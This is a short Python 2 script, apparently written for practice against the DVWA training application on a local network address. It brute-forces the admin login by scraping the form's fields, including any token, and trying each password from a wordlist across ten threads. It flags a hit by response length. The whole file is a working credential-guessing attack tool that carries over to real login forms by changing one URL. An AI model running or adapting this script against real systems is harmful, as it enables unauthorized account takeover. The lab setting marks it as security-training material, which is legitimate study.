import requests
from bs4 import BeautifulSoup as bs
import threading
import Queue

class Crack(object):
    def __init__(self,pwd_queue):
        self.pwd_queue = pwd_queue
        self.url = 'http://192.168.0.104/DVWA/login.php'

    def post(self):
        while not self.pwd_queue.empty():
            pwd = self.pwd_queue.get()
            session = requests.Session()
            response = session.get(self.url)
            data = self.extract(response,pwd)
            
            response = session.post(self.url,data)
            if len(response.content) > 2000:
                print 'username:'+data['username']
                print 'password:'+data['password']

    def extract(self,response,pwd):
        html = response.content
        data = {}

        soup = bs(html,'lxml')
        inputs = soup.find_all(name='input')

        for input in inputs:
            try:
                data[input['name']] = input['value']
            except:
                if input['name'] == 'username':
                    data[input['name']] = 'admin'
                elif input['name'] == 'password':
                    data[input['name']] = pwd
        return data


def main():
    threads = []
    thread_max =10
    pwd_queue = Queue.Queue()
    
    with open('dic.txt','r') as f:
        for pwd in f.readlines():
            pwd_queue.put(pwd.strip('\n'))
    
    crack = Crack(pwd_queue)
    
    for i in range(thread_max):
        threads.append(threading.Thread(target=crack.post))

    for i in threads:
        i.setDaemon(True)

    for i in threads:
        i.start()

    for i in threads:
        i.join(5)

if __name__ == "__main__":
    main()